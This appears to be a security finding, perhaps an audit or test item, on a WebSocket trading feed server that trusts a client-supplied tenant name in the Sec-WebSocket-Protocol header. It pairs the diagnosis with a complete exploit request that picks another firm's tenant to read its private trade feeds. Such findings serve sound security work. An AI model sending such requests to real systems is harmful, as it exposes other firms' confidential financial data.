diagnosis: The trading feed server handles WebSocket upgrades by extracting the tenant identifier directly from the client-supplied Sec-WebSocket-Protocol header without cryptographic validation, token verification, or session checking. An attacker can connect with a subprotocol such as tenant-hedgefund_alpha to subscribe directly to another financial firm's private real-time trade execution feeds and order book fills.
exploit_request:
GET /ws/trading HTTP/1.1
Host: feeds.prime-brokerage.internal:8080
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: json-stream, tenant-apex_capital_llc
